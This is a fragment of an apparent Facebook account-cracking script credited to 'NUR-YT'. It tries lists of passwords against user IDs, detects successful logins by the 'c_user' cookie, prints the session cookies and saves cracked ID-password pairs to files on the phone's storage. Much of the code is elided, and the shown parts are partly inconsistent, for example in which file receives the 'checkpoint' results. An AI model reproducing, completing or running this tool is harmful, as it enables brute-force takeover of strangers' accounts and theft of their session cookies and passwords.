...
\033[91;1m|_| \_|\____/|_|  \_\    \033[92;1m|_|     |_|       VERSION 1
\033[1;30m───────────────────────────────────────────
\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\33[1;92m AUTHOR    : NUR-YT           
\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m] \33[1;92mFACEBOOK  : NUR-YT           
...
def Main():
        os.system("clear")
        os.system('xdg-open ')
        os.system('espeak -a 300 "WELCOME TO NUR RANDOM TOOLS"')
        print(logo)
...
def fuck():
    ...
    print(' [+] OK Ids saved in NUR/OK.txt')
    print(' [+] CP Ids saved in NUR/CP.txt')
    print('•────────────────•°•❀•°•────────────────•')
def BKsexy2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;92m[NUR]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
           ...
           'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;92m[NUR-OK🔥🖤🍎] {uid}|{ps} \nCookie[🍒] : {coki}")
                open('/sdcard/NUR/OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;94m[NUR-CP☠️] {uid}|{ps}")
                open('/sdcard/NUR-OK.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
